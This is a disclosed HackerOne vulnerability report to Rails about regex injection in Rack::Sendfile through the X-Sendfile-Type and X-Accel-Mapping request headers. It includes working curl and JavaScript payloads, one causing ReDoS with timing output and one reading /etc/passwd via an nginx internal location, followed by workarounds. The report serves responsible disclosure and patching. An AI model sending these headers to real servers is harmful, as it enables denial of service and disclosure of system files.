# Regex Injection from request header (Rack::Sendfile, send_file)

## Report Details
- **Report ID**: 1057216
- **URL**: https://hackerone.com/reports/1057216
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-12T02:57:06.870Z
- **Disclosed**: 2021-06-15T17:43:06.159Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
I have confirmed that [Rack::Sendfile](https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb) and the Rails [send_file](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file) that handles it have a problem handling custom headers for request.

It is expected that the `X-Sendfile-type` and `X-Accel-Mapping` headers will be sent from nginx, but these headers can also be sent from a user agent such as a browser. This allows Regexp injection to cause unexpected regular expression behavior.

https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb#L143

```ruby
def variation(env)
  @variation ||
    env['sendfile.type'] ||
    env['HTTP_X_SENDFILE_TYPE']
end

def map_accel_path(env, path)
  if mapping = @mappings.find { |internal, _| internal =~ path }
    path.sub(*mapping)
  elsif mapping = env['HTTP_X_ACCEL_MAPPING']
    mapping.split(',').map(&:strip).each do |m|
      internal, external = m.split('=', 2).map(&:strip)
      new_path = path.sub(/^#{internal}/i, external)
      return new_path unless path == new_path
    end
    path
  end
end
```    

If not set on the application side, the value used for `internal` can be sent from the request header.

This problem seems to be a problem on the Rack side, but since it has a large impact on Rails and a vulnerability in Rack has been reported to Rails in the past(https://hackerone.com/reports/431561, https://hackerone.com/reports/895727), I will submit it here. 

### Case 1. ReDoS via Regex Injection

Example of rails controller.

```ruby
class FilesController < ApplicationController
  def index
    send_file("./README.md")
  end
end
```

Or a simple example of rack app.

```ruby
class SendFile
  def call(env)
    [ 200,
      {        },

      File.open("./config.ru")
    ]
  end
end

use Rack::Sendfile
run SendFile.new
```

An example of a curl attack on these servers.

```
curl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:(([^\r])+.)+[^\r]([\r])+=/www/' http://localhost:3000/files
```

[ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS#redos-via-regex-injection) is possible because the value of `X-Accel-Mapping` is used for the regular expression.

Executing the curl code will increase the CPU usage on the server side.In puma, the server becomes unresponsive when requests are made for the number of wokrers. When I try to start puma threads as 5 on my local machine, running curl 5 times makes the server unresponsive!

```
$ time ruby -e 'puts ("a"*32).gsub(/^(([^\r])+.)+[^\r]([\r])+/, "test")'
...
0.23s user 0.04s system 56% cpu 0.479 total

$ time ruby -e 'puts ("a"*40).gsub(/^(([^\r])+.)+[^\r]([\r])+/, "test")'
...
8.03s user 0.04s system 97% cpu 8.242 total

$ time ruby -e 'puts ("a"*44).gsub(/^(([^\r])+.)+[^\r]([\r])+/, "test")'
...
55.92s user 0.16s system 99% cpu 56.370 total
```

How long it actually takes depends on the depth of the path where the server is located. It is also possible to send a more dangerous regular expression than the example.

From javascript it will be as follows.

```javascript
fetch("http://localhost:3000/file", {headers: {"X-Sendfile-type":"X-Accel-Redirect", "X-Accel-Mapping":"(([^\\r])+.)+[^\\r]([\\r])+=/www/"}})
```


### Case 2. Unexpected access to internal

Example nginx.conf.

```
events {
    worker_connections  16;
}
http {
    server {
        listen 80;
        server_name localhost;

        location /rails {
            proxy_pass http://rails_app/;
            
            proxy_redirect off;
        }

        location /secret_internal {
            internal;
            alias /etc/passwd;
        }
    }
}
```

```
curl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:/.*=/secret_internal' http://localhost:80/rails/files
```

You can get `/etc/passwd`, a file that should not be accessible.

## Impact

Affects various Rails applications that use send_file with [Rack 1.1.0](https://github.com/rack/rack/commit/981f182bcfa1b848aa9e66c72500d855f6ee77ff
) and later versions.

This can be confirmed by requesting a location that handles file downloads, so if this vulnerability information is disclosed, it may be tried in many locations. It is difficult to guess where case2 will occur, but case1 is simple. Especially in OSS, the attacker can easily check because the place of use is known.

The following patterns are affected.

* Applications that do not set a value for `x_sendfile_header`.
If set `config.action_dispatch.x_sendfile_header = ''`, it will be workaround.

* Using X-Accel-Redirect, but X-Accel-Mapping is not set.
It becomes workaround by adding X-Accel-Mapping to all proxy settings of nginx.

I think it's safe to stop using custom headers for requests in Rack. But it's a breaking change.

## Attachments
No attachments
